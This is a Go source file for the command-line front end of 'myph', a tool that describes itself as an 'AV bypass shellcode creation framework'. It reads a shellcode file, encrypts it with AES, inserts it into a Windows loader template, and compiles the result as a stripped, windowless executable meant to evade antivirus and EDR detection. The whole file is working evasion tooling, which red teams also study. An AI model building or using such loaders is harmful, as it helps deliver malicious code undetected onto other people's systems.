package cli

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/spf13/cobra"

	"github.com/cmepw/myph/loader"
)

func GetParser(opts *Options) *cobra.Command {
    version := "0.0.1"
    var cmd = &cobra.Command{
        Use: "myph",
        Version: version,
        DisableSuggestions : true,
        Short: "AV bypass shellcode creation framework",
        Long: `CLI to prepare your shellcode and do AV/EDR bypass`,
        Run: func(cmd *cobra.Command, args []string) {

            pre_encrypted_payload, err := loader.ReadFile(opts.ShellcodePath); if err != nil {
                fmt.Println("Read shellcode error: %s", err.Error())
                os.Exit(1)
            }

            payload, err := loader.EncryptPayload(pre_encrypted_payload, []byte(opts.AesKey)); if err != nil {
                fmt.Println("Encryption error: %s", err.Error())
                os.Exit(1)
            }

            s := loader.Shellcode{
                Payload: payload,
                Filename: opts.Outfile,
                AesKey: []byte(opts.AesKey),
            }

            toCompile := loader.LoadWindowsTemplate(s)
            err  = loader.WriteToTempfile(toCompile); if err != nil {
                fmt.Println("Write error: %s", err.Error())
                os.Exit(1)
            }

            /* run compilation */
            err = exec.Command("go", "build", "-ldflags", "-w -s -H=windowsgui", "-o", s.Filename, "tmp.go").Run()
            if err != nil {
                println("[!] Compile error: " + err.Error())
                return
            }
        },
    }

    defaults := GetDefaultCLIOptions()

    cmd.PersistentFlags().StringVarP(&opts.Outfile, "outfile", "o", defaults.Outfile, "output filepath")
    cmd.PersistentFlags().StringVarP(&opts.ShellcodePath, "shellcode", "s", defaults.ShellcodePath, "shellcode path")
    cmd.PersistentFlags().StringVarP(&opts.AesKey, "aes-key", "a", defaults.AesKey, "aes shellcode encryption key")

    return cmd
}
